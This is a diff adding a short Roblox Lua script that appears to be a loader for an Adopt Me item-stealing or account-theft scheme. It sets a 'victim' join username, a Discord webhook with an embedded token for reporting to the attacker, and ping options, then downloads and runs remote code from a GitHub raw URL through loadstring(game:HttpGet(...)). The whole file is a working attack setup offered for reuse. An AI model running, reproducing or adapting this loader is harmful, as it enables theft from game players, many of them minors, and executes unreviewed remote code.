@@ -1,0 +1,7 @@
+_G.Username = "captainbling1245" -- user you should join victim on
+_G.min_value = 1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook =
+    "https://discord.com/api/webhooks/1350306060006850642/ZxxiK12q8pElclYRyFIfjEXxX6pgal8NAqd3JR6fpSsPG7nFPT7otCD5hdvl4ukY9C0d" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ayandaddycoder/adoptme1/refs/heads/main/adoptmeage.lua"))()
